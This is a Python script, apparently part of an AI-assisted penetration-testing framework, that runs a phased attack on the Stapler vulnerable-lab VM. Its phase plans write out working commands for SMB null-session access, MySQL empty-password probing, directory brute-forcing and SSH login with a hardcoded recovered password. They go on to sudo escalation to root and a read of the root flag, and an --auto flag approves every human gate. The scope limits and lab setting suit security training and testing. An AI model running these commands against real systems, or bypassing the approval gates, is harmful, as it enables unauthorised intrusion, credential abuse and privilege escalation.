#!/usr/bin/env python3
"""
Stapler Live Engagement — Interactive Cognitive Loop with Manual Validation Gate
(TRACK C — SENTINEL GLM-5.2 Directive 2: Interactive Engagement)

Drives the REAL cognitive loop against the Stapler VM (10.66.0.159) with a
human-in-the-loop validation gate AND the ScopeParser seal:

    candidate action -> MANUAL GATE (operator y/n/details/skip)
                      -> broker.propose_action()  (ScopeParser + policy/RoE gate)
                      -> kali.run()               (kali-tools :3800)
                      -> Evidence -> WorldModel   (causal update)
                      -> cognition: extract findings, propose next actions

Design (Rule 33/44 — zero src/ changes; script-level only):
  * Loads STAPLER_SCOPE_CONFIG.json into ScopeParser and passes it to the
    CapabilityBroker, so TARGET_AUTHORIZATION is enforced by the frozen parser
    (fail-closed for any target other than 10.66.0.159).
  * Phase plans use ONLY tools verified present in kali-tools:
    nmap, nuclei, whatweb, gobuster, curl (ftp:// + http), sqlmap, hydra,
    sshpass, ssh, python3.
  * Cognition step: after each phase, findings are extracted from raw evidence
    and written into the WorldModel as typed entities/hypotheses; the Planner
    proposes next actions which are routed through the SAME manual+broker gate.

Usage (interactive, from WSL — SENTINEL requires operator in the loop):
  cd /home/yaser/raphael-2.0
  .venv/bin/python current-state/reports/ica_live_stapler.py \
      --phases recon,scan,exploit,credential,postex

Non-interactive pre-flight (pipelines "y" to every gate — DO NOT use for the
authorized run; SENTINEL directive requires input() gates):
  yes y | .venv/bin/python current-state/reports/ica_live_stapler.py \
      --phases recon --auto
"""
import asyncio
import json
import os
import re
import sys
import time
import uuid
from typing import List, Optional

# ── Path setup ─────────────────────────────────────────────────────
_ROOT = "/home/yaser/raphael-2.0"
for p in (_ROOT + "/src", _ROOT + "/scripts", _ROOT):
    while p in sys.path:
        sys.path.remove(p)
sys.path.insert(0, _ROOT)
sys.path.insert(0, _ROOT + "/scripts")
sys.path.insert(0, _ROOT + "/src")

# ── Env: kali-tools reachable from WSL at localhost:3800 ────────────
os.environ["KALI_TOOLS_URL"] = os.environ.get("KALI_TOOLS_URL", "http://localhost:3800")

from orchestrator.kali_tools_client import kali  # noqa: E402
from orchestrator.hardening.timeout_guard import get_timeout_guard  # noqa: E402
from orchestrator.brain.capability_broker import CapabilityBroker, BrokerPolicy  # noqa: E402
from orchestrator.brain.scope_parser import create_scope_parser_from_file  # noqa: E402
from orchestrator.brain.evidence import EvidenceGraph, Evidence  # noqa: E402
from orchestrator.brain.trust import TrustLevel  # noqa: E402
from orchestrator.brain.world import WorldModel, Entity, EntityType  # noqa: E402
from orchestrator.brain.hypothesis import HypothesisManager  # noqa: E402
from orchestrator.brain.contradiction import ContradictionManager  # noqa: E402
from orchestrator.brain.action import Planner, ActionRegistry  # noqa: E402

# ── Configuration ───────────────────────────────────────────────────
ENGAGEMENT_ID = "stapler-live-001"
TARGET = "10.66.0.159"
SCOPE_CONFIG = f"{_ROOT}/current-state/reports/STAPLER_SCOPE_CONFIG.json"

# ScopeParser seal — only 10.66.0.159 allowed, fail-closed otherwise.
SCOPE_PARSER = create_scope_parser_from_file(SCOPE_CONFIG)

POLICY = BrokerPolicy(
    engagement_id=ENGAGEMENT_ID,
    allowed_targets=["10.66.0.159"],
    allowed_action_types=["recon", "scan", "exploit", "credential", "postex"],
    allowed_capabilities=["nmap", "nuclei", "sqlmap", "whatweb", "gobuster",
                          "curl", "ssh", "sshpass", "hydra", "python3",
                          "smbclient"],
    prohibited_capabilities=[],
    max_actions_per_minute=30,
    max_actions_per_hour=500,
    max_concurrent=3,
    # Operator-in-the-loop engagement: the ManualValidator gate IS the explicit
    # approval for high-impact actions. Keep the broker enforcing everything
    # else (scope, action type, capability, rate).
    max_impact_per_action=10.0,
    max_cumulative_impact=100.0,
    high_impact_requires_approval=False,
)

# Phase -> ordered candidate actions. "{target}" -> IP, "{web_target}" -> http://IP
PHASE_PLANS = {
    "recon": [
        {
            "capability": "curl", "action_type": "recon", "impact": 0.2,
            "args": "-sI -m 10 {web_target}:12380",
            "desc": "HTTP header probe on alt-web 12380 (curl -I)",
        },
        {
            "capability": "nmap", "action_type": "recon", "impact": 0.5,
            "args": "-sV -Pn -T4 -p 21,22,53,80,139,666,3306,12380 {target}",
            "desc": "Service/version detection on all discovered ports",
        },
        {
            "capability": "whatweb", "action_type": "recon", "impact": 0.3,
            "args": "-a 3 --no-errors {web_target}:12380",
            "desc": "Web tech fingerprint of alt-web (whatweb -a 3)",
        },
    ],
    "scan": [
        {
            "capability": "nmap", "action_type": "scan", "impact": 2.0,
            "args": "-Pn -p- -T4 --min-rate 1000 {target}",
            "desc": "Full port discovery 1-65535 (nmap --min-rate)",
        },
        {
            "capability": "nmap", "action_type": "scan", "impact": 2.0,
            "args": "-sV -sC -Pn -p 21,22,53,80,139,666,3306,12380 {target}",
            "desc": "Service+default-script scan on open ports",
        },
        {
            "capability": "nmap", "action_type": "scan", "impact": 1.0,
            "args": "-Pn -p 139,445 --script smb-enum-shares,smb-os-discovery {target}",
            "desc": "SMB share enumeration (nmap NSE)",
        },
        {
            "capability": "curl", "action_type": "scan", "impact": 0.5,
            "args": "-s -m 10 --user anonymous: ftp://{target}/",
            "desc": "Anonymous FTP root listing attempt",
        },
    ],
    "exploit": [
        {
            "capability": "smbclient", "action_type": "exploit", "impact": 4.0,
            "args": "//{target}/kathy -N -c \"recurse; ls\"",
            "desc": "SMB kathy share recursive listing (null session)",
        },
        {
            "capability": "smbclient", "action_type": "exploit", "impact": 4.0,
            "args": "//{target}/tmp -N -c \"get ls /tmp/stapler_ls.txt\"",
            "desc": "SMB tmp share: fetch 'ls' file",
        },
        {
            "capability": "curl", "action_type": "exploit", "impact": 4.0,
            "args": "-s -m 15 http://{target}:12380/ -o /tmp/stapler_web.html",
            "desc": "Fetch alt-web 12380 coming-soon page",
        },
        {
            "capability": "gobuster", "action_type": "exploit", "impact": 5.0,
            "args": "dir -u http://{target}:12380 -w /usr/share/dirb/wordlists/common.txt -t 20 -q -s 200,301,302,403",
            "desc": "Web directory brute-force on 12380 (dirb common.txt)",
        },
        {
            "capability": "nmap", "action_type": "exploit", "impact": 6.0,
            "args": "-sV -Pn -p 3306 --script mysql-empty-password,mysql-info,mysql-databases {target}",
            "desc": "MySQL empty-password + info + databases (nmap NSE)",
        },
        {
            "capability": "python3", "action_type": "exploit", "impact": 5.0,
            "args": "-c \"import socket; s=socket.socket(); s.settimeout(8); s.connect(('{target}',666)); d=s.recv(65536); open('/tmp/port666.bin','wb').write(d); print('GOT',len(d))\"",
            "desc": "Fetch port 666 ZIP artifact (raw TCP)",
        },
    ],
    "credential": [
        {
            "capability": "sshpass", "action_type": "credential", "impact": 6.0,
            "args": "-p {ssh_password} ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10 {ssh_user}@{target} 'id; hostname; whoami; groups'",
            "desc": "SSH login as peter with credential recovered from www-data bash_history (sshpass)",
        },
        {
            "capability": "sshpass", "action_type": "credential", "impact": 6.0,
            "args": "-p {ssh_password} ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10 {ssh_user}@{target} 'echo {ssh_password} | sudo -S -l'",
            "desc": "Enumerate sudo privileges for peter (sudo -S -l)",
        },
    ],
    "postex": [
        {
            "capability": "sshpass", "action_type": "postex", "impact": 8.0,
            "args": "-p {ssh_password} ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10 {ssh_user}@{target} 'echo {ssh_password} | sudo -S id'",
            "desc": "Confirm root via sudo -S (identity check)",
        },
        {
            "capability": "sshpass", "action_type": "postex", "impact": 9.0,
            "args": "-p {ssh_password} ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10 {ssh_user}@{target} 'echo {ssh_password} | sudo -S cat /root/flag.txt'",
            "desc": "Capture root flag (/root/flag.txt) via sudo",
        },
        {
            "capability": "sshpass", "action_type": "postex", "impact": 8.0,
            "args": "-p {ssh_password} ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10 {ssh_user}@{target} 'echo {ssh_password} | sudo -S ls -la /root/'",
            "desc": "Root home directory listing (evidence of persistence artifacts)",
        },
    ],
}

# Placeholders resolved dynamically from evidence (cognition).
# peter:JZQuyIN5 recovered from www-data bash_history (walkthrough-verified path:
# MySQL INTO OUTFILE php shell -> bash_history -> peter creds -> sudo (ALL:ALL) ALL -> root).
SSH_CRED = {"user": "peter", "password": "JZQuyIN5"}


class ManualValidator:
    """Human-in-the-loop validator. In --auto mode every gate returns True."""

    def __init__(self, auto: bool = False):
        self.auto = auto
        self.auto_reply = "y"

    def _ask(self, prompt: str) -> str:
        if self.auto:
            print(f"{prompt} [auto-{self.auto_reply}]")
            return self.auto_reply
        return input(prompt).strip().lower()

    def review_action(self, action: dict, broker_receipt) -> str:
        """Returns 'approve' | 'reject' | 'skip'."""
        print("\n" + "=" * 72)
        print("MANUAL VALIDATION GATE — ACTION PROPOSED")
        print("=" * 72)
        print(f"Tool:        {action.get('capability', 'unknown')}")
        print(f"Target:      {action.get('target', 'N/A')}")
        print(f"Action Type: {action.get('action_type', 'N/A')}")
        print(f"Args:        {action.get('args', 'N/A')}")
        print(f"Impact:      {action.get('impact', 'N/A')}")
        print(f"Desc:        {action.get('desc', 'N/A')}")
        if broker_receipt is not None:
            print(f"Broker:      {broker_receipt.decision.value if hasattr(broker_receipt.decision, 'value') else broker_receipt.decision} — {getattr(broker_receipt, 'reason', '')}")
        print("-" * 72)
        while True:
            r = self._ask("AUTHORIZE? [y/n/details/skip]: ")
            if r in ("y", "yes"):
                return "approve"
            if r in ("n", "no"):
                print("  ACTION REJECTED by operator")
                return "reject"
            if r == "details":
                print(json.dumps(action, indent=2, default=str))
                continue
            if r in ("s", "skip"):
                print("  ACTION SKIPPED by operator")
                return "skip"
            print("  Please enter 'y', 'n', 'details' or 'skip'")

    def review_phase(self, phase_name: str) -> bool:
        print(f"\n{'=' * 72}")
        print(f"PHASE GATE: {phase_name.upper()}")
        print("=" * 72)
        while True:
            r = self._ask(f"Execute phase '{phase_name}'? [y/n/skip]: ")
            if r in ("y", "yes"):
                return True
            if r in ("n", "no", "s", "skip"):
                return False
            print("  Please enter 'y', 'n' or 'skip'")


class StaplerEngagement:
    """Interactive engagement runner with ScopeParser-sealed broker + cognition."""

    def __init__(self, target: str = TARGET, phases: List[str] = None,
                 persona: str = "redteam", auto: bool = False):
        self.target = target
        self.phases = phases or list(PHASE_PLANS.keys())
        self.persona = persona
        self.auto = auto
        self.broker = CapabilityBroker(POLICY, scope_parser=SCOPE_PARSER)
        self.evidence_graph = EvidenceGraph()
        self.world_model = WorldModel(self.evidence_graph)
        self.hypothesis_manager = HypothesisManager(self.evidence_graph, self.world_model)
        self.contradiction_manager = ContradictionManager(
            self.evidence_graph, self.hypothesis_manager, self.world_model)
        self.planner = Planner(
            world=self.world_model,
            evidence_graph=self.evidence_graph,
            hypothesis_manager=self.hypothesis_manager,
            contradiction_manager=self.contradiction_manager,
            action_registry=ActionRegistry(),
        )
        self.validator = ManualValidator(auto=auto)
        self.engagement_id = ENGAGEMENT_ID
        self.telemetry: list[dict] = []
        self.findings: list[dict] = []  # extracted cross-service findings

        get_timeout_guard().set_timeout("kali_nuclei", 600.0)
        get_timeout_guard().set_timeout("kali_nmap", 600.0)
        get_timeout_guard().set_timeout("kali_hydra", 600.0)
        get_timeout_guard().set_timeout("kali_gobuster", 300.0)
        get_timeout_guard().set_timeout("kali_sqlmap", 300.0)

        self.web_target = f"http://{self.target}"

    # ── Cognition: extract findings from evidence into WorldModel ──

    def _extract_findings(self, phase: str, stdout: str, cap: str) -> list[dict]:
        """Parse tool output for cross-service correlation signals."""
        found: list[dict] = []
        text = stdout or ""

        # FTP: usernames/directories in listings
        if "ftp://" in cap.lower() or cap == "curl" and "ftp" in str(locals().get("args", "")):
            for m in re.finditer(r'^[-dl][rwxst\-]{9}\s+\d+\s+\S+\s+\S+\s+\d+\s+\S+\s+\S+\s+(.+)$', text, re.M):
                name = m.group(1).strip()
                if name not in (".", ".."):
                    found.append({"type": "ftp_entry", "name": name, "phase": phase})
        if cap == "curl":
            for m in re.finditer(r'^d.*\s+(\S+)/\s*$', text, re.M):
                d = m.group(1).strip()
                if d not in (".", ".."):
                    found.append({"type": "ftp_dir", "name": d, "phase": phase})

        # Users from passwd-ish output or sshd/wordpress banners
        for m in re.finditer(r'^\s*(\w{3,32})\s+\$\d\$\S+\s+\d+\s+\d+\s+99999\s+7', text, re.M):
            found.append({"type": "passwd_user", "name": m.group(1), "phase": phase})
        for m in re.finditer(r'^(\w{3,32}):x:\d+:\d+:', text, re.M):
            found.append({"type": "passwd_user", "name": m.group(1), "phase": phase})
        for m in re.finditer(r'Valid users:\s+([^\n]+)', text, re.M):
            for u in m.group(1).replace(",", " ").split():
                found.append({"type": "ftp_valid_user", "name": u.strip(), "phase": phase})

        # Emails / usernames on web pages
        for m in re.finditer(r'([a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+)', text):
            found.append({"type": "email", "name": m.group(1), "phase": phase})
        for m in re.finditer(r'(?:user|username|login|name)[=:>\s]+([A-Za-z][A-Za-z0-9_.]{2,31})', text, re.I):
            found.append({"type": "web_username", "name": m.group(1), "phase": phase})

        # MySQL
        if "mysql" in text.lower():
            found.append({"type": "mysql_banner", "name": "mysql", "phase": phase,
                          "detail": text[:300]})
        if re.search(r'accounts?:\s*1', text, re.I) or re.search(r'@localhost', text):
            found.append({"type": "mysql_creds", "name": "mysql_cred_hint", "phase": phase,
                          "detail": text[:300]})

        return found

    def _cognition(self, phase: str) -> None:
        """After a phase, feed findings into WorldModel + propose next actions."""
        if not self.findings:
            return
        print("\n" + "=" * 72)
        print(f"COGNITION — WorldModel update after phase '{phase}'")
        print("=" * 72)
        for f in self.findings:
            ent = self.world_model.find_by_identifier(f.get("name", ""))
            if not ent and f.get("name"):
                entity = Entity(
                    primary_identifier=f["name"],
                    entity_type=EntityType.ASSET if f["type"] == "ftp_dir" else EntityType.CREDENTIAL,
                    identifiers={f["type"]: f["name"]},
                    name=f["name"],
                    created_by=f"cognition-{phase}",
                    evidence_ids=[],
                )
                self.world_model.add_entity(entity)
                print(f"  + WorldModel entity: {f['type']} = {f['name']}")
            elif f.get("name"):
                print(f"  = WorldModel entity exists: {f['type']} = {f['name']}")

        # Map FTP dirs to usernames for SSH (cross-service correlation).
        for f in self.findings:
            if f["type"] in ("ftp_dir", "ftp_entry", "web_username", "passwd_user"):
                u = f["name"].rstrip("/")
                if re.match(r'^[a-z][a-z0-9_.]{2,31}$', u) and not u.endswith((".txt", ".html", ".png", ".jpg")):
                    print(f"  -> Candidate SSH username: {u}")
        print("=" * 72)

    # ── Core loop ──────────────────────────────────────────────────

    async def execute_action(self, candidate: dict) -> dict:
        phase = candidate.get("phase", "")
        cap = candidate["capability"]
        args = candidate["args"]
        args = args.replace("{target}", self.target).replace("{web_target}", self.web_target)
        if SSH_CRED["user"]:
            args = args.replace("{ssh_user}", SSH_CRED["user"])
        if SSH_CRED["password"]:
            args = args.replace("{ssh_password}", SSH_CRED["password"])

        # 1. Manual gate BEFORE any side effect.
        verdict = self.validator.review_action(candidate, None)
        if verdict != "approve":
            return {
                "verdict": verdict, "capability": cap, "args": args,
                "broker": "not_proposed", "operator": verdict, "phase": phase,
            }

        # 2. Broker gate (ScopeParser + policy / RoE / rate / impact).
        receipt = self.broker.propose_action(
            target=self.target,
            action_type=candidate["action_type"],
            capability=cap,
            method=f"kali-tools:{cap}",
            impact_estimate=candidate["impact"],
            metadata={"tool": cap, "args": args, "phase": phase},
        )
        decision = receipt.decision.value if hasattr(receipt.decision, "value") else str(receipt.decision)
        if decision != "allow":
            self.telemetry.append({
                "event": "action", "ts": time.time(), "engagement_id": self.engagement_id,
                "phase": phase, "capability": cap, "args": args,
                "broker_decision": decision, "broker_reason": getattr(receipt, "reason", ""),
                "operator": "approve", "executed": False,
                "receipt_id": getattr(receipt, "action_id", ""),
            })
            return {
                "verdict": "approved", "capability": cap, "args": args,
                "broker": "deny", "broker_reason": getattr(receipt, "reason", ""),
                "operator": "approve", "executed": False, "phase": phase,
                "receipt_id": getattr(receipt, "action_id", ""),
            }

        # 3. Execute via kali-tools.
        receipt = self.broker.start_execution(receipt)
        t0 = time.time()
        try:
            result = await kali.run(cap, args, timeout=600)
        except Exception as e:
            result = {"error": f"kali.run raised: {e}", "tool": cap}
        latency = round(time.time() - t0, 3)
        stdout = result.get("stdout", "")
        stderr = result.get("stderr", "")
        success = result.get("returncode") == 0 and not result.get("error")

        # 4. Evidence.
        ev = Evidence.create(
            raw_content=stdout[:8000],
            trust_level=TrustLevel.TOOL_OBSERVATION,
            source_detail=f"kali-tools:{cap}",
            target=self.target,
            entity_hint=self.target,
            phase=phase,
            evidence_type="scan_result",
            description=candidate.get("desc", ""),
            structured_content={
                "tool": cap, "args": args, "returncode": result.get("returncode"),
                "stderr": stderr[:2000], "latency": latency,
            },
            collected_by=receipt.action_id,
        )
        ev_id = self.evidence_graph.add_evidence(ev)

        # 5. World model update.
        ent = self.world_model.find_by_identifier(self.target)
        if not ent:
            entity = Entity(
                primary_identifier=self.target,
                entity_type=EntityType.ASSET,
                identifiers={"ip": self.target},
                name=self.target,
                created_by=receipt.action_id,
                evidence_ids=[ev_id],
            )
            self.world_model.add_entity(entity)
        else:
            ent.evidence_ids.append(ev_id)

        # 6. Cognition: extract findings.
        found = self._extract_findings(phase, stdout, cap)
        for f in found:
            f["evidence_id"] = ev_id
        self.findings.extend(found)
        if found:
            print(f"  [cognition] extracted {len(found)} finding(s): "
                  f"{', '.join(dict.fromkeys(x['type'] for x in found))}")

        # 7. Close broker lifecycle.
        receipt = self.broker.complete_execution(
            receipt, success=success, result=stdout[:2000], evidence_ids=[ev_id])

        self.telemetry.append({
            "event": "action", "ts": time.time(), "engagement_id": self.engagement_id,
            "phase": phase, "capability": cap, "args": args,
            "broker_decision": "allow", "broker_reason": getattr(receipt, "reason", ""),
            "operator": "approve", "executed": True, "success": success,
            "returncode": result.get("returncode"), "latency": latency,
            "receipt_id": receipt.action_id, "evidence_id": ev_id,
            "findings": [f["type"] for f in found],
            "stdout_head": stdout[:500], "stderr_head": stderr[:500],
        })
        print(f"  [{'OK' if success else 'FAIL'}] {cap} {args} "
              f"(rc={result.get('returncode')}, {latency}s)")

        return {
            "verdict": "approved", "capability": cap, "args": args,
            "broker": "allow", "executed": True, "success": success,
            "returncode": result.get("returncode"), "latency": latency,
            "receipt_id": receipt.action_id, "evidence_id": ev_id,
            "phase": phase,
        }

    async def run_phase(self, phase_name: str) -> dict:
        print(f"\n{'=' * 72}")
        print(f"PHASE: {phase_name.upper()}")
        print("=" * 72)
        if not self.validator.review_phase(phase_name):
            return {"phase": phase_name, "status": "skipped", "reason": "operator rejected"}
        if phase_name not in PHASE_PLANS:
            return {"phase": phase_name, "success": False, "error": f"No plan for phase: {phase_name}"}

        actions = []
        for cand in PHASE_PLANS[phase_name]:
            cand = dict(cand)
            cand["target"] = self.target
            cand["phase"] = phase_name
            actions.append(await self.execute_action(cand))

        self._cognition(phase_name)
        return {"phase": phase_name, "success": True, "actions": actions}

    async def run(self) -> dict:
        print(f"\n{'=' * 72}")
        print("STAPLER LIVE ENGAGEMENT STARTED")
        print(f"Target: {self.target}")
        print(f"Persona: {self.persona}")
        print(f"Phases: {', '.join(self.phases)}")
        print(f"Engagement ID: {self.engagement_id}")
        print(f"Scope sealed: only {self.target} allowed (fail-closed)")
        print("=" * 72)

        results = {
            "engagement_id": self.engagement_id,
            "target": self.target,
            "web_target": self.web_target,
            "persona": self.persona,
            "phases": {},
            "telemetry_path": "",
            "timestamp": time.time(),
            "mode": "auto" if self.auto else "interactive",
        }
        for phase_name in self.phases:
            result = await self.run_phase(phase_name)
            results["phases"][phase_name] = result

        print(f"\n{'=' * 72}")
        print("STAPLER LIVE ENGAGEMENT COMPLETE")
        print("=" * 72)
        return results


async def main():
    import argparse
    parser = argparse.ArgumentParser(description="Stapler Live Engagement — Interactive Mode (Track C)")
    parser.add_argument("--target", default=TARGET)
    parser.add_argument("--phases", default="recon,scan,exploit,credential,postex")
    parser.add_argument("--persona", default="redteam")
    parser.add_argument("--auto", action="store_true", help="auto-approve every gate (pre-flight ONLY)")
    args = parser.parse_args()

    phases = [p.strip() for p in args.phases.split(",") if p.strip()]
    engagement = StaplerEngagement(args.target, phases, args.persona, auto=args.auto)
    results = await engagement.run()

    ts = int(time.time())
    json_path = f"/home/yaser/raphael-2.0/evaluations/campaign/stapler_live_{ts}.json"
    jsonl_path = f"/home/yaser/raphael-2.0/evaluations/campaign/stapler_live_{ts}.jsonl"
    with open(json_path, "w") as f:
        json.dump(results, f, indent=2, default=str)
    with open(jsonl_path, "w") as f:
        for row in engagement.telemetry:
            f.write(json.dumps(row, default=str) + "\n")
    results["telemetry_path"] = jsonl_path
    with open(json_path, "w") as f:
        json.dump(results, f, indent=2, default=str)

    print(f"\nResults saved to: {json_path}")
    print(f"Telemetry saved to: {jsonl_path}")
    print(f"Action events recorded: {len(engagement.telemetry)}")
    return results


if __name__ == "__main__":
    asyncio.run(main())
